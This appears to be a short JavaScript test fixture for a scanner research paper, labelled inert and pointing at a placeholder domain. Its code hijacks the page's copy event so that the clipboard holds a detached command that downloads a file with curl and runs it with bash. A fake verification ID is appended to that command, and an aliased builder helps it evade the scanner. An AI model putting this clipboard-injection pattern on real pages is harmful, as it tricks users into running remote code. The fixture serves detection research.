// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the builder is reached through a reassignable var alias.
function detach(command) { return `nohup bash -c "${command}" >/dev/null 2>&1 &`; }
function buildCommand(origin, nonce) { return detach(`curl -ks ${origin}/demo -o /tmp/demo && bash /tmp/demo`) + ` # Verification ID ${nonce}`; }
var build = buildCommand;
document.addEventListener('copy', event => { event.preventDefault(); event.clipboardData.setData('text/plain', build('https://example.invalid', 'VERIFY-0000')); });
